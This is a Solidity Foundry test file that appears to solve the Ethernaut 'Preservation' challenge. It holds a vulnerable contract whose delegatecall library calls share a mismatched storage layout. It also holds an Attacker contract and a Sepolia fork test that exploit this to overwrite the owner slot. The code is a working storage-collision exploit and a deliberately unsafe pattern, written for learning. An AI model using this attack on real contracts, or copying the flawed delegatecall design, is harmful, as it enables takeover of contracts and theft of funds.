// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Attacker{
    address public _a;
    address public _b;
    address public victimAddressPlaceHolder; // slot 2, same as the slot for Preservation.owner

    address constant owner = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;
    Preservation p;

    constructor(Preservation _p){
        p = _p;
    }

    function attack() external {
        uint value = uint(uint160(address(this)));
        p.setFirstTime(value); // this sets p.timeZone1Library to the attacker contract
        require(p.timeZone1Library() == address(this), "Changing library failed");
        p.setFirstTime(0);
    }

    function setTime(uint _ignored) public {
        victimAddressPlaceHolder = owner;
    }
}

contract AttackerTest is Test{
    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_take_preservation() public{
        Preservation p = Preservation(0x3f6D64be7A9B00FA67C3E1ca7f3A3c565A6E9cAf);
        address owner = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;
        Attacker attacker = new Attacker(p);
        attacker.attack();

        require(p.owner() == owner, "Attack failed");
    }
}
